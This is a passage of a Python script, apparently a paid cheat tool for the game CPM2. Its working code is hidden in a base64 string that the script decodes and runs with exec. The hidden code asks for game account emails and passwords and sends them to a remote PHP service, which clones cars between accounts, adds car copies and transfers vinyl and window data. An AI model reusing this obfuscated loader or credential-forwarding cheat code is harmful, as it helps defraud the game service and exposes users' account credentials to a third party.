zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGFjY291bnRfcGFzc3dvcmRfaW5wdXQgPSBpbnB1dCgi8J+UkCBFbnRlciBDUE0yIEFjY291bnQgUGFzc3dvcmQgdG8gY2xvbmUgdG86ICIpLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICAgICAgYWN0aW9uX3Jlc3VsdCA9IGNhbGxfcGhwX3NlcnZpY2Vfd2l0aF9zcGlubmVyKGFjY2Vzc19rZXksICJjbG9uZV9jYXJzX2NwbTJfdG9fY3BtMiIsIHRva2VuLCBlbWFpbCwgcGFzc3dvcmQsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJhY2NvdW50X2VtYWlsIjogYWNjb3VudF9lbWFpbF9pbnB1dCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJhY2NvdW50X3Bhc3N3b3JkIjogYWNjb3VudF9wYXNzd29yZF9pbnB1dAogICAgICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgICAgIGVsaWYgY2hvaWNlID09ICIyNiI6CiAgICAgICAgICAgICAgICAgICAgICAgIGNhcl9pZF90b19hZGRfaW5wdXQgPSBpbnB1dCgi8J+alyBFbnRlciB0aGUgQ2FyIElEIHRvIGFkZDogIikuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgY2FyX2lkX3RvX2FkZF9pbnB1dC5pc2RpZ2l0KCkgb3IgaW50KGNhcl9pZF90b19hZGRfaW5wdXQpIDw9IDA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgi4p2MIEludmFsaWQgQ2FyIElELiBJdCBtdXN0IGJlIGEgcG9zaXRpdmUgaW50ZWdlci4iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgwLjUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQoKICAgICAgICAgICAgICAgICAgICAgICAgbnVtX2NvcGllc19pbnB1dCA9IGlucHV0KCLwn5SiIEhvdyBtYW55IGNvcGllcyB0byBhZGQgKDEtMjApPyAiKS5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBudW1fY29waWVzX2lucHV0LmlzZGlnaXQoKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCLinYwgSW52YWxpZCBudW1iZXIgb2YgY29waWVzLiBJdCBtdXN0IGJlIGEgbnVtYmVyLiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDAuNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgIG51bV9jb3BpZXNfaW50ID0gaW50KG51bV9jb3BpZXNfaW5wdXQpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG51bV9jb3BpZXNfaW50IDwgMSBvciBudW1fY29waWVzX2ludCA+IDIwOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIuKdjCBUaGUgbnVtYmVyIG9mIGNvcGllcyBtdXN0IGJlIGJldHdlZW4gMSBhbmQgMjAuIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC41KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGFjdGlvbl9yZXN1bHQgPSBjYWxsX3BocF9zZXJ2aWNlX3dpdGhfc3Bpbm5lcihhY2Nlc3Nfa2V5LCAiYWRkX2NhciIsIHRva2VuLCBOb25lLCBOb25lLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiY2FyX2lkIjogY2FyX2lkX3RvX2FkZF9pbnB1dCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJudW1fY29waWVzIjogbnVtX2NvcGllc19pbnQKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjI3IjoKICAgICAgICAgICAgICAgICAgICAgICAgY2FyX2lkX3RvX2FkZF9pbnB1dCA9IGlucHV0KCLwn5qXIEVudGVyIHRoZSBDYXIgSUQgdG8gYWRkOiAiKS5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBjYXJfaWRfdG9fYWRkX2lucHV0LmlzZGlnaXQoKSBvciBpbnQoY2FyX2lkX3RvX2FkZF9pbnB1dCkgPD0gMDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCLinYwgSW52YWxpZCBDYXIgSUQuIEl0IG11c3QgYmUgYSBwb3NpdGl2ZSBpbnRlZ2VyLiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDAuNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICAgICAgICAgICAgICAgICBudW1fY29waWVzX2lucHV0ID0gaW5wdXQoIvCflKIgSG93IG1hbnkgY29waWVzIHRvIGFkZCAoMS0yMCk/ICIpLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IG51bV9jb3BpZXNfaW5wdXQuaXNkaWdpdCgpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIuKdjCBJbnZhbGlkIG51bWJlciBvZiBjb3BpZXMuIEl0IG11c3QgYmUgYSBudW1iZXIuIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC41KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgbnVtX2NvcGllc19pbnQgPSBpbnQobnVtX2NvcGllc19pbnB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbnVtX2NvcGllc19pbnQgPCAxIG9yIG51bV9jb3BpZXNfaW50ID4gMjA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgi4p2MIFRoZSBudW1iZXIgb2YgY29waWVzIG11c3QgYmUgYmV0d2VlbiAxIGFuZCAyMC4iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgwLjUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgYWN0aW9uX3Jlc3VsdCA9IGNhbGxfcGhwX3NlcnZpY2Vfd2l0aF9zcGlubmVyKGFjY2Vzc19rZXksICJhZGRfY2FyMiIsIHRva2VuLCBOb25lLCBOb25lLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiY2FyX2lkIjogY2FyX2lkX3RvX2FkZF9pbnB1dCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJudW1fY29waWVzIjogbnVtX2NvcGllc19pbnQKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjI4IjoKICAgICAgICAgICAgICAgICAgICAgICAgY2FyX2lkX3RvX2FkZF9pbnB1dCA9IGlucHV0KCLwn5qXIEVudGVyIHRoZSBDYXIgSUQgdG8gYWRkOiAiKS5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBjYXJfaWRfdG9fYWRkX2lucHV0LmlzZGlnaXQoKSBvciBpbnQoY2FyX2lkX3RvX2FkZF9pbnB1dCkgPD0gMDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCLinYwgSW52YWxpZCBDYXIgSUQuIEl0IG11c3QgYmUgYSBwb3NpdGl2ZSBpbnRlZ2VyLiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDAuNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICAgICAgICAgICAgICAgICBudW1fY29waWVzX2lucHV0ID0gaW5wdXQoIvCflKIgSG93IG1hbnkgY29waWVzIHRvIGFkZCAoMS0yMCk/ICIpLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IG51bV9jb3BpZXNfaW5wdXQuaXNkaWdpdCgpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIuKdjCBJbnZhbGlkIG51bWJlciBvZiBjb3BpZXMuIEl0IG11c3QgYmUgYSBudW1iZXIuIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC41KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgbnVtX2NvcGllc19pbnQgPSBpbnQobnVtX2NvcGllc19pbnB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbnVtX2NvcGllc19pbnQgPCAxIG9yIG51bV9jb3BpZXNfaW50ID4gMjA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgi4p2MIFRoZSBudW1iZXIgb2YgY29waWVzIG11c3QgYmUgYmV0d2VlbiAxIGFuZCAyMC4iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgwLjUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgYWN0aW9uX3Jlc3VsdCA9IGNhbGxfcGhwX3NlcnZpY2Vfd2l0aF9zcGlubmVyKGFjY2Vzc19rZXksICJhZGRfY2FyMyIsIHRva2VuLCBOb25lLCBOb25lLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiY2FyX2lkIjogY2FyX2lkX3RvX2FkZF9pbnB1dCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJudW1fY29waWVzIjogbnVtX2NvcGllc19pbnQKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBlbGlmIGNob2ljZSA9PSAiMTkiOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgi4pyoIFRyYW5zZmVycmluZyB2aW55bHMuLi4iKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiVGhlIHN5c3RlbSB3aWxsIG5vdyBmaW5kIHlvdXIgJ3NvdXJjZScgYW5kICd0YXJnZXQnIGNhcnMuIikKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnN1cmUgb25lIGNhciBoYXMgYSB2aW55bCB3aXRoIHRleHQgJ3NvdXJjZScgYW5kIGFub3RoZXIgaGFzICd0YXJnZXQnLiIpCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb25fcmVzdWx0ID0gY2FsbF9waHBfc2VydmljZV93aXRoX3NwaW5uZXIoYWNjZXNzX2tleSwgInRyYW5zZmVyX3ZpbnlsIiwgdG9rZW4sIGVtYWlsLCBwYXNzd29yZCkKICAgICAgICAgICAgICAgICAgICBlbGlmIGNob2ljZSA9PSAiMjAiOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgi4pyoIFRyYW5zZmVycmluZyB3aW5kb3cgZGF0YS4uLiIpCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJUaGUgc3lzdGVtIHdpbGwgbm93IGZpbmQgeW91ciAnc291cmNlJyBhbmQgJ3RhcmdldCcgY2Fycy4iKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiUGxlYXNlIGVuc3VyZSBvbmUgY2FyIGhhcyBhIHdpbmRvdyB3aXRoIHRleHQgJ3NvdXJjZScgYW5kIGFub3RoZXIgaGFzICd0YXJnZXQnLiIpCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb25fcmVzdWx0ID0gY2FsbF9waHBfc2VydmljZV93aXRoX3NwaW5uZXIoYWNjZXNzX2tleSwgInRyYW5zZmVyX3dpbmRvdyIsIHRva2VuLCBlbWFpbCwgcGFzc3dvcmQpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgYWN0aW9uX3Jlc3VsdCA9IHsib2siOiBGYWxzZSwgIm1lc3NhZ2UiOiAiSW52YWxpZCBjaG9pY2Ugb3Igb3B0aW9uIG5vdCBhdmFpbGFibGUgZm9yIHRoaXMgZ2FtZS4ifQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBhY3Rpb25fcmVzdWx0ID0geyJvayI6IEZhbHNlLCAibWVzc2FnZSI6ICJJbnZhbGlkIGNob2ljZSBvciBvcHRpb24gbm90IGF2YWlsYWJsZSBmb3IgdGhpcyBnYW1lLiJ9CgogICAgICAgICAgICAgICAgaWYgYWN0aW9uX3Jlc3VsdC5nZXQoIm9rIik6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiLinIUge2FjdGlvbl9yZXN1bHQuZ2V0KCdtZXNzYWdlJywgJ0FjdGlvbiBzdWNjZXNzZnVsLicpfSIpCiAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChmIuKdjCB7YWN0aW9uX3Jlc3VsdC5nZXQoJ21lc3NhZ2UnLCAnQWN0aW9uIGZhaWxlZC4nKX0iKQogICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKCiAgICAgICAgICAgICAgICBpc192YWxpZF9rZXksIHVwZGF0ZWRfdXNlcl9kYXRhID0gY2hlY2tfYWNjZXNzX2tleV9hbmRfZ2V0X3VzZXJfc3RhdHVzKGFjY2Vzc19rZXkpCiAgICAgICAgICAgICAgICBpZiBpc192YWxpZF9rZXk6CiAgICAgICAgICAgICAgICAgICAgaXNfdW5saW1pdGVkX3VzZXIgPSB1cGRhdGVkX3VzZXJfZGF0YVsnaXNfdW5saW1pdGVkJ10KICAgICAgICAgICAgICAgICAgICBjdXJyZW50X2NvaW5zX2Zvcl9kaXNwbGF5ID0gdXBkYXRlZF91c2VyX2RhdGFbJ2NvaW5zJ10KICAgICAgICAgICAgICAgICAgICB0ZWxlZ3JhbV9pZF9mb3JfZGlzcGxheSA9IHVwZGF0ZWRfdXNlcl9kYXRhLmdldCgndGVsZWdyYW1faWQnLCAnTi9BJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIuKaoO+4jyBDb3VsZCBub3QgcmV0cmlldmUgdXBkYXRlZCB1c2VyIHN0YXR1cy4gUGxlYXNlIGNoZWNrIGNvbm5lY3Rpb24uIikKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdGltZS5zbGVlcCgxKQ=="
try:
    src = base64.b64decode(payload_b64).decode("utf-8")
    exec(compile(src, "<embedded>", "exec"), globals())
except Exception as e:
    sys.stderr.write("Error while executing embedded payload: " + str(e) + "\n")
    raise
